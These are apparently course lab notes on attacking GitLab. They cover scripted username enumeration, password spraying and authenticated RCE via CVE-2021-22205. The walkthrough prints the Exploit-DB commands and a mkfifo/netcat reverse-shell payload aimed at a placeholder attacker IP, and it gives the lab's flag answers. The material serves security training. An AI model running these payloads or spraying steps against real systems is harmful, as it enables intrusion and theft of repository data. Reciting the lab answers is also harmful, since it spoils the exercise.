# Section 18 — Attacking GitLab

## ID
909

## Module
Attacking Common Applications

## Kind
notes

## Title
Section 18 — Attacking GitLab

## Description
Covers enumerating valid GitLab usernames via a scripted registration-form check, then exploiting CVE-2021-22205 (authenticated RCE via ExifTool metadata handling) in GitLab CE 13.10.2 and below to gain a reverse shell as the `git` user.

## Tags
gitlab, user-enumeration, rce, exiftool, cve-2021-22205, reverse-shell

## Commands
- `searchsploit -m ruby/webapps/49821.sh`
- `./49821.sh --url http://gitlab.inlanefreight.local:8081 --userlist <WORDLIST>`
- `searchsploit -m ruby/webapps/49951.py`
- `python3 49951.py -t http://gitlab.inlanefreight.local:8081 -u <USER> -p <PASS> -c '<REVERSE_SHELL_CMD>'`
- `nc -nvlp <PORT>`

## What This Section Covers
Two attack techniques against GitLab: scripted username enumeration (leveraging the registration form behavior from the previous section at scale) and authenticated remote code execution against GitLab CE ≤ 13.10.2. The RCE vulnerability exists because GitLab's ExifTool integration doesn't properly sanitize metadata in uploaded image files, allowing arbitrary command execution. Since it's authenticated, you either need valid credentials (from OSINT, credential guessing, or password spraying) or the ability to self-register an account.

## Background — GitLab Security Context

- 553 CVEs reported as of September 2021
- Notable RCE-vulnerable versions: 11.4.7, 12.9.0, 13.9.3, 13.10.2, 13.10.3
- **Account lockout defaults:** 10 failed attempts → auto-unlock after 10 minutes (configurable in admin UI since version 16.6 via `max_login_attempts` and `failed_login_attempts_unlock_period_in_minutes`)
- GitLab does **not** consider user/project enumeration a vulnerability (per their HackerOne policy) — but it's still useful for building target lists

## Methodology

### Phase 1 — Username Enumeration

1. **Download the enumeration script** from Exploit-DB:
   ```
   searchsploit -m ruby/webapps/49821.sh
   ```

2. **Prepare a wordlist** — use SecLists default usernames or a custom list:
   ```
   /opt/useful/seclists/Usernames/cirt-default-usernames.txt
   ```

3. **Run the enumeration script:**
   ```
   ./49821.sh --url http://gitlab.inlanefreight.local:8081 --userlist /opt/useful/seclists/Usernames/cirt-default-usernames.txt
   ```
   The script sends registration requests and checks HTTP response codes. A `200` response means the username exists; a `302` redirect means it doesn't.

4. **Filter for hits:**
   ```
   ./49821.sh --url http://gitlab.inlanefreight.local:8081 --userlist /opt/useful/seclists/Usernames/cirt-default-usernames.txt | grep exists
   ```

5. **With a valid username list** — attempt controlled password spraying with common passwords (`Welcome1`, `Password123`, etc.) or try credential reuse from public breach dumps. Be mindful of the 10-attempt lockout threshold.

### Phase 2 — Authenticated RCE (GitLab CE ≤ 13.10.2)

6. **Download the RCE exploit** from Exploit-DB:
   ```
   searchsploit -m ruby/webapps/49951.py
   ```

7. **Start a Netcat listener** on your attack box:
   ```
   nc -nvlp 9001
   ```

8. **Run the exploit** with valid credentials (either from enumeration/spraying or self-registration):
   ```
   python3 49951.py -t http://gitlab.inlanefreight.local:8081 -u <USERNAME> -p <PASSWORD> -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <YOUR_IP> 9001 >/tmp/f'
   ```
   The exploit authenticates, creates a malicious payload embedded in image metadata, uploads it as a snippet, and triggers ExifTool processing — which executes your command.

9. **Catch the shell** — you land as the `git` user in the `~/gitlab-workhorse` directory:
   ```
   git@app04:~/gitlab-workhorse$
   ```

### Phase 3 — Post-Exploitation

10. **Grab the flag and enumerate:**
    ```
    cat flag_gitlab.txt
    ls
    id
    ```
    You're running as `git` (uid=996) — not root. On a real engagement, you'd escalate privileges from here and pivot into the internal network.

## How the Exploit Works (CVE-2021-22205)

The vulnerability is in how GitLab processes uploaded images. GitLab uses **ExifTool** to strip metadata from image files. The flaw is that ExifTool's DjVu module evaluates certain metadata fields unsafely, allowing injected commands to be executed during the metadata parsing phase. The exploit:

1. Authenticates to GitLab with valid credentials
2. Crafts a malicious image file with a command embedded in its metadata
3. Uploads the image as part of a GitLab snippet
4. When GitLab's backend processes the upload, ExifTool parses the metadata and executes the embedded command
5. The command runs as the `git` service user

This is why it's "authenticated" — you need to be logged in to upload files. But if self-registration is open, anyone can create an account and exploit it.

## Lab — Questions & Answers

| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Find another valid user on the target GitLab instance | DEMO | Run `./49821.sh --url http://gitlab.inlanefreight.local:8081 --userlist /opt/useful/seclists/Usernames/cirt-default-usernames.txt \| grep exists` → `[+] The username DEMO exists!` |
| Q2: Gain RCE and submit the flag | s3cure_y0ur_Rep0s! | Register account → run `python3 49951.py` with reverse shell command → `cat flag_gitlab.txt` in the `~/gitlab-workhorse` directory |

## Key Takeaways

- **Username enumeration + password spraying is a real attack chain** — enumerate users via `/users/sign_up`, spray common passwords respecting the 10-attempt lockout, then use valid creds for authenticated exploits
- **Self-registration turns authenticated RCE into effectively unauthenticated RCE** — if anyone can register, anyone can exploit it
- **The `git` user has access to all repository data** — even without root, compromising the GitLab service user means access to every repo, including private ones
- **ExifTool vulnerabilities are a recurring theme** — similar metadata-parsing flaws have appeared in other applications; always check if an app processes uploaded image metadata
- **searchsploit is your friend** — `searchsploit -m` copies exploits locally so you can review and modify them before running

## Gotchas

- The reverse shell command uses the mkfifo technique — make sure your listener is running **before** you fire the exploit, because there's no retry
- The exploit script is Python3 — if the Pwnbox has issues, check `python3 --version` and ensure `requests` is installed
- The lab uses port **8081** for GitLab, not the default — adjust your exploit `-t` URL accordingly
- The flag file `flag_gitlab.txt` is in the directory you land in (`~/gitlab-workhorse`), not in `/root` or `/home` — just `cat` it immediately
- Account lockout is 10 attempts / 10 minute unlock — if password spraying, keep attempts per user well below this threshold and space them out
